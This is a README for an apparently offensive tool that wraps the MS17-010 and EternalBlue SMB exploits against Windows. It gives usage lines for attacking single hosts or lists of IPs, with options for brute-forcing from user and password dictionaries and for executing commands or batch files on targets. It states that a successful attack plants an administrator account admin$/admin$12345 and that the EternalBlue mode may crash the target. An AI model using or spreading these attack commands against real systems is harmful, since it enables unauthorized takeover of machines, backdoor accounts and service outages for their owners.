# ms17010-nsa-EternalBlue
integration ms17010 and nsa-EternalBlue

Mainly integrated with nsa's Eternal Blue and ms17010 series poc. Eternal blue poc has windows 7/2008 and windows 8/2012 x64 ms17010 is win all, Windows Vista can successfully obtain system permissions anonymously, vista above requires named pipe access permissions, generally requires domain user permissions.

Usage: "usage:MyExploiter.py [options] target"

Options:

  --version             show program's version number and exit
  
  -h, --help            show this help message and exit
  
  -m MODE, --mode=MODE  attack mode 0:ms17010 attack one; 1: ms17010 attack by
  
                        file; 2:blue attack one;3:blue attack Mul;4:check
						
                        one;5:check Mul)
						
  -p PORT, --port=PORT  SMB SERVICE PORT
  
  -u USER, --user=USER  SMB USER
  
  -U USERS, --users=USERS user file,SMB USERS
						
  --pwd=password        SMB USER PASSWORD
  
  --pwds=passwords, --pwds=passwords  pwd file,EACH SMB USER PASSWORDS
						
  -t THREADS, --threads=THREADS  thread num
						
  -c COMMOND, --cmd=COMMOND  execute commond on target
						
  -b BATCH, --batch=BATCH    batch file,execute batch file on target
  
Eg: Mode 0: The ms17010 attack is automatically executed. After the attack is successful, the target machine increases the administrator account admin$/admin$12345.
  
ms17010EXP 192.168.1.10 || ms17010EXP -U user.txt --pwds=pwd.txt -t (number of threads) 2 192.168.1.10
  
Mode 1: Execute the ms17010 attack in batches. After the attack is successful, the target machine increases the administrator account admin$/admin$12345.
  
ms17010EXP -m 1 ip.txt || ms17010EXP -m 1 -U user.txt --pwds=pwd.txt -t(threads) 2 ip.txt
  
Mode 2: Execute the Eternal Blue attack, shellcode is shellcode.bin, successful target or blue screen or add user admin$/admin$12345
  
ms17010EXP -m 2 192.168.1.10
  
Mode 3, batch eternal blue attack, ms17010EXP -m 3 ip.txt
  
Mode 4, detecting whether the target machine is patched and the access status of the named pipe ms17010EXP -m 4 192.168.1.10
  
Mode 5, batch detection ms17010EXP -m 5 -t 2 --users=user.txt --pwds=pwd.txt ip.txt

Note: The last line of the username dictionary password dictionary is blank, that is, each line must have a newline.
  
						
Based on: https://github.com/worawit/MS17-010

## Credit to zzwlpx (~_^)

